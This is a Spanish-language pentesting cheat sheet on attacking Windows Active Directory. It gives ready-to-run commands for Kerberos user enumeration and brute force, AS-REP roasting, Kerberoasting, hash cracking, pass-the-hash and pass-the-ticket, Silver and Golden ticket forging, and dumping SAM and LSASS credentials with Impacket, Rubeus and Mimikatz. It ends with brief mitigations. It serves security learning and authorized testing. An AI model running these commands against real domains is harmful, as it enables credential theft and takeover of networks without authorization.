---
title: Pentesting Windows AD
---

## Impacket, Bloudhound y Rubeus

**Impacket** es una colección de herramientas realizada en Python que trabaja con protocolos de red a bajo nivel. Algunos protocolos son SMB1-3 y MSRPC.

**Bloudhound** es una herramienta que utiliza gráficos para revelar las relaciones ocultas (relaciones de confianza, grupos anidados, etc..) dentro de un Active Directory. Se puede usar con **neo4j** que es un software orientado a grafos.

**Rubeus** es una herramienta que permite ejecutar diversos tipos de ataques contra el protocolo Kerberos. Herramienta de post-explotación. Pertenece a Ghostpack.

## Enumeration SMB (445) y RDP(139)

Con la herramienta **enum4linux.pl** se puede enumerar la información de los servicios SMB(445) y RDP(139).

```bash
sudo ./enum4linux -a [IP]
```

## Kerbrute

**Kerbrute** es una herramienta de bruteforce y <span style="color:orange">enumeración de cuentas AD</span> a través de la Pre-Authentication Kerberos.

Enumeración de usuarios:

```bash
kerbrute userenum -d [domain] --dc [dc_domain] [list_user.txt]
```

Bruteforce con cuenta de usuario AD:

```bash
kerbrute bruteforce -d [domain] --dc [dc_domain] [pass.txt] [user]
```

Ventajas:

- Solo se necesita visibilidad del KDC (Key Distribution Center).
- Los errores de pre-authentication de Kerberos se registran como 4771 (Kerberos pre-authentication failure) y no como 4625 (logon failure).
- Kerberos indica si un usuario es correcto o no.
- Se pueden descubrir cuentas de usuarios que no requieran pre-authentication (ASREPRoast).

<span style="color:red">Se pueden bloquear cuentas de dominio si se hace fuerza bruta</span>

## AS-REP Roasting

Este ataque se basa en encontrar usuarios que no requieran pre-authentication de Kerberos. 

El funcionamiento del **AS-REP Roasting** permite que cualquiera pueda enviar una petición AS-REQ en nombre de esos usuarios, ya que no necesita cifrar el **timestamp** con las credenciales del usuario, y esto devolverá una petición AS-REP correctamente.

La respuesta AS-REP contiene un pedazo del mensaje cifrado con la clave del usuario. Con este mensaje, se puede tratar de crackear offline para obtener las credenciales de dicho usuario.

En caso de que se disponga de una cuenta de usuario del dominio, se podrían obtener los usuarios que no necesiten pre-authentication Kerberos con una consulta LDAP:

```bash
(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))
```

Con la herramienta **GetNPUsers.py** de Impacket podemos recolectar mensajes AS-REP sin pre-authentication desde una lista de usuarios:

```bash
python GetNPUsers.py [domain]/ -usersfile [user.txt] -format hashcat -outfile hashes.asreproast
python GetNPUsers.py [domain]/[user] -no-pass
```

Usando **Rubeus.exe**:

```bash
Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast
```

## Crackeando peticiones AS-REP (Hashcat o John)

Con Hashcat:

```bash
hashcat -m 18200 --force -a 0 hashes.asreproast [pass.txt]
```

Con John:

```bash
john --wordlist=password_kerb.txt hashes.asreproast
```

## Kerberoasting !REVISAR¡

<span style="color:red">Necesario credenciales de un usuario del dominio sin privilegios</span>

Recolectar TGS's para aquellos servicios que corren en el contexto de un usuario del dominio. Ya que los TGS's incluyen un pedazo de datos cifrado con una clave derivada de la contraseña de dichos usuarios, y después crackearlas offline. 

Para obtener las cuentas de usuario que tien servicios asociados, se puede usar el filtro LDAP:

```bash
(&(samAccountType=805306368)(servicePrincipalName=*))
```

Con la herramienta **GetUserSPN.py** (impacket):

```bash
python GetUserSPN.py [domain]/[users]:[password] --outputfile hashes.kerberoast
```

Con este comando, obtenemos un fichero con un TGS por linea que se puede utilizar en Hascat o John para obtener las credenciales de los usuarios.

Con la herramienta **Rubeus.exe** (desde el Windows del usuario del dominio comprometido):

```bash
Rubeus.exe Kerberoast /outfile:hashes.Kerberoast
```

## Crackeando los TGS's

Con **Hashcat**:

```bash
hashcat -m 13100 --force -a 0 hashes.Kerberoast [pass.txt]
```

Con **John**:

```bash
john --format=krb5tgs --wordlist=[pass.txt] hashes.Kerberoast
```

## Pass The Hash ¡Falta!

## Overpass The Hash/Pass The Key (PTK)

Se utiliza el hash NTLM de un usuario para solicitar tickets de Kerberos, como alternativa al típico Pass The Hash sobre el protocolo NTLM.**Esta tecnica es útil en redes donde el protocolo NTLM se encuentra deshabilitado y solamente Kerberos permite este protocolo como autenticación.**

<span style="color:red">Necesario el hash NTLM o contraseña del usuario</span>. Con estas credenciales, se puede solicitar un TGT (Ticket Granting Tickets) y utilizar después este para acceder a culaquier servicio del dominio en nombre del usuario.

Con **getTGT.py** (impacket):

```bash
python getTGT.py [domain]/[user] -hashes [hash NTLM]
```

Obteniendo el TGT, podemos usar otras herramientas como **psexec.py** para acceder a los sistemas Windows que se pueda con el TGT. Importamos el TGT en el sistema:

```bash
export KRB5CCNAME=/root/impacket-examples/[user.ccache]
```

```bash
python psexec.py [domain]/[user]@[equipo domain] -k -no-pass
```

Se obtendra una shell. Este ticket se puede utilizar con otros scripts de Impacket con el parametro -k u otras herramientas ya que este ticket TT se guarda en un fichero .ccache (formato utilizado en Linux para almacenar tickets)

<span style="color:green">Troubleshooting: KDC can't found the name: Se resuelve usando el nombre del dominio en vez de la IP [equipo domain] mejor el nombre</span>

Con **Rubeus.exe** y **PsExec**, el siguiente comando importa el ticket en Windows:

```bash
Rubeus.exe asktgt /domain:[domain] /user:[user] /rc4:[hash NTLM] /ptt
```

Obtenemos una shell en dicho equipo:

```bash
.PsExec.exe -accepteula \[IP/equipo].[domain] cmd
```

## Pass The Ticket (PTT)

Se trata de obtener un ticket de usuario y utilizarlo para ganar acceso a los recursos para los que el usuario tenga permisos. Es necesario conseguir también la clave de sesión.

- Se pueden obtener los tickets mediante un ataque Man-In-The-Middle, ya que los tickets se envían por TCP y UDP. Aunque con un MITM no podemos obtener las claves de sesión.

- Otro metódo es extraer los tickets de la memoria del proceso lsass donde también están las claves de sesión. Usando Mimikatz.

<span style="color:red">Es preferible obtener un TGT antes que un TGS que cuenta con la limitación de que solo se puede usar contra un servicio. Los tickets tienen 10 de horas de vida.</span>

#### Maneras de recolectar Ticket

Desde Linux, los tickets se pueden almacenar en credential: cache y ccaches

- Ficheros => /tmp y su nombre suele ser krb5cc_%{uid}
- Kernel Keyrings => son un espacio de memoria especial en el kernel de Linux para almacenamiento de claves.
- Memoria de procesos => utilizada cuando un solo proceso necesita acceder al ticket.

<span style="color:red">Se puede verificar donde se almacenan los tickets comprobando: default_ccache_name (/etc/krb5.conf)</span> si no esta este parametro, por defecto es /tmp.

Solo es necesario copiar estos ticketsa nuestra máquina para realizar el Pass The Ticket. Para los tickets que se encuentran en Keyrings, se puede utilizar un script heracles.sh y para los tickets almacenados en proceso, es necesario realizar un análisis de memoria.

Los tickets almacenados en los keyrings user o session solo pueden ser accedidos por el propietario en su sesión.<span style="color:red">Aunque cuando la herramienta se ejecuta como root, busca otras sesiones de usuario en la misma máquina y se inyecta en cada una de ellas para poder acceder a los tickets</span>

```bash
evil-winrm -i [ip_address] -u [user] -H [hash]
```

Desde Windows, el proceso lsass (Local Security Authority Subsystem Service) es el encargado de almacenar los tickets en un Sistema Windows. Es necesario establecer una comunicación con lsass y pedirlos.

- Si no es Administrador -> Solo se pueden recuperar tickets propios
- Si es Administrador -> Todos los tickets pueden ser recolectados

<span style="color:red">¡No extrae tickets expirados!</span>

Con **Mimikatz.exe**:

```bash
sekurlsa::tickets /export
```

Con **Rubeus**:

```bash
.Rubeus dump
```

## Conviertiendo tickets entre Windows y Linux

Windows y Linux no guardan los tickets con el mismo formato: ccache (Linux) y kirbi (Windows)

Con **ticket_converter.py**:

```bash
python ticket_converter.py ticket.ccache ticket.kirbi

python ticket_converter.py ticket.kirbi ticket.ccache
```

## Acceder al sistema con el ticket


Desde Linux, utilizando psexec.py de Impacket:

```bash
export KRB5CCNAME=/root/impacket-examples

python psexec.py [domain name]/[user client]@[target machine] -k -no-pass
```

Si Impacket devolvía un error [-] SMB SessionError:STATUS_ACCESS_DENIED, esto se debe a que se usó un ticket sin la flag A (pre-autenticado), ya que el propietario no necesita autenticación para solicitar el ticket. Para comprobar si un ticket tiene el flag A activado:

```bash
klist -f -c [ticket]
```

Desde Windows, utilizando mimikatz.exe para inyectar el ticket sin ningún privilegio:

```bash
kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-[domain name].kirbi
```

(result: OK)

Después con psexec.py:

```bash
.PsExec.exe -accepteula \[target_machine] [command]
```

Con Rubeus para inyectar tickets:

```bash
Rubeus.exe ptt /ticket:[0;28419fe]-2-1-40e00000-trex@krbtgt-[domain name].kirbi
```

Tras inyectar el ticket de un usuario, es posible suplantarlo en máquinas remotas, pero no en la local, donde no se aplica Kerberos.

## Silver Ticket

Se basa en construir un TGS válido para un servicio con el hash NTLM del propietario del servicio. Es posible acceder a este servicio con un TGS personalizado que contenga privilegios más elevados.
Es posible forjar tickets utilizando las claves AES de un usuario (AES128 y AES256) las cuales se calculan a partir de la contraseña del mismo, aunque a diferencia del hash NTLM, se encuentran salteadas con el dominio y el nombre del usuario.

Desde Linux, usando **ticketer.py** de Impacket:

```bash
python ticketer.py -nthash [NTLM hash] -domain-sid [sid] -domain [domain_name] -spn
```

Ejecución similar a PTT, pero el ticket se crea manualmente a través del hash NTLM.

Desde Windows, usando Mimikatz para forjar el ticket, se debe tener en cuenta que el ticket se puede construir en una máquina local fuera de la red objetivo, y luego enviarselo a la máquina deseada e inyectarlo con Rubeus, y ejecutar comandos remotos con PsExec.py

```bash
kerberos::golden /domain:[domain_name] /sid:[sid] /rc4:[NTLM] /user:[user] /service:[service] /target:[target_machine]
```

## Golden Ticket

Es similar al Silver Ticket, pero trata de crear un TGT utilizando el hash NTLM de la cuenta krbtgt del dominio.

<span style="color:red">Se pueden obtener el hash NTLM de la cuenta krbtgt del proceso lsass o fichero NTDS.dit de cualquier DC del dominio o utilizar la técnica DC sync utilizando el módulo lsadump::dcsync o secretsdump.py de Impacket (Se necesita privilegios de admin de DC)</span>

El método es el mismo desde Linux y Windows, pero con el hash de krbtgt. Es importante recordar que los tickets tienen 20 minutos de validación para PAC, por lo que es importante crear los tickets y usarlos después.

## Dumping Credentials en Windows

Una vez que tenemos las credenciales de una cuenta sistema host (no del dominio) debemos obtener todas las contraseñas de cuentas posibles.<span style="color:red">El objetivo es obtener las credenciales de una cuenta que pertenezca al grupo Administradores del Dominio</span>

Tecnicas utilizadas para volcar las credenciales de un Windows Host comprometido:

1. Copiar los registros SAM, SECURITY y SYSTEM y descargarlos en el sistema local:

- C:> reg.exe save hklm\sam C:\temp\sam.save
- C:> reg.exe save hklm\security C:\temp\security.save
- C:> reg.exe save hklm\system C:\temp\system.save

2. Password hashes: Obtener los hashes de las contraseñas de local, credenciales del dominio cacheadas.

```bash
secretsdump.py -sam sam.save -security security.save -system system.save [domain]/[user]:[password]@[ip address]
```

## Mitigaciones

- Cambiar las contraseñas de manera periódica
- Habilitar una política fuerte de contraseñas
- Evitar el uso de cuentas sin pre-autenticación
- Evitar la ejecución de servicios en el contexto de cuentas de usuario: Poner pseudo-contraseas a estas cuentas.
- Deshabilitar los algoritmos de cifrado débiles de Kerberos: Solo permitir AES.


## Bibliografía


[Github Impacket](https://github.com/SecureAuthCorp/impacket)<br>
[Explicación de sus distintas herramientas](secureauth.com/labs/open-source-tools/impacket)<br>
[Github Bloodhound](https://github.com/BloodHoundAD/BloodHound)<br>
[Github Rubeus](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)<br>
[Github enum4linux](https://github.com/CiscoCXSecurity/enum4linux)<br>
[Github Evil-winrm](https://github.com/Hackplayers/evil-winrm)<br>
